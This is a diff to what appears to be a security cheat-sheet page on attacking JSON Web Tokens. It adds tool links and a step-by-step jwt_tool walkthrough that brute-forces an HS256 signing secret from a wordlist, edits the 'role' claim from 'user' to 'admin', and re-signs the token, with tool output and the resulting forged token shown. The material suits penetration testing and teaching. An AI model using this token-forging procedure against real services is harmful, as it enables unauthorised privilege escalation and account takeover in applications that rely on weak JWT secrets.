@@ -9,6 +9,11 @@
 - JWT Signature - RS256 to HS256
 - Breaking JWT's secret
 
+## Tools
+
+- [jwt_tool](https://github.com/ticarpi/jwt_tool)
+- [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
+
 ## JWT Format
 
 JSON Web Token : `Base64(Header).Base64(Data).Base64(Signature)`
@@ -133,9 +138,66 @@ jwt.decode(encoded, 'Sn1f', algorithms=['HS256']) # decode with 'Sn1f' as the se
 
 ### JWT tool
 
-```bash
+First, bruteforce the "secret" key used to compute the signature.
+
+```powershell
 git clone https://github.com/ticarpi/jwt_tool
-python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw /usr/share/wordlists/rockyou.txt
+python2.7 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI /tmp/wordlist
+
+Token header values:
+[+] alg = HS256
+[+] typ = JWT
+
+Token payload values:
+[+] sub = 1234567890
+[+] role = user
+[+] iat = 1516239022
+
+File loaded: /tmp/wordlist
+Testing 5 passwords...
+[+] secret is the CORRECT key!
+```
+
+Then edit the field inside the JSON Web Token.
+
+```powershell
+Current value of role is: user
+Please enter new value and hit ENTER
+> admin
+[1] sub = 1234567890
+[2] role = admin
+[3] iat = 1516239022
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+```
+
+Finally, finish the token by signing it with the previously retrieved "secret" key.
+
+```powershell
+Token Signing:
+[1] Sign token with known key
+[2] Strip signature from token vulnerable to CVE-2015-2951
+[3] Sign with Public Key bypass vulnerability
+[4] Sign token with key file
+
+Please select an option from above (1-4):
+> 1
+
+Please enter the known key:
+> secret
+
+Please enter the keylength:
+[1] HMAC-SHA256
+[2] HMAC-SHA384
+[3] HMAC-SHA512
+> 1
+
+Your new forged token:
+[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
+[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
 ```
 
 ### JWT cracker
@@ -165,3 +227,4 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
 - [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)](https://nandynarwhals.org/hitbgsec2017-pasty/)
 - [Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
 - [Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq](https://github.com/dwyl/learn-json-web-tokens)
+- [Simple JWT hacking - @b1ack_h00d](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
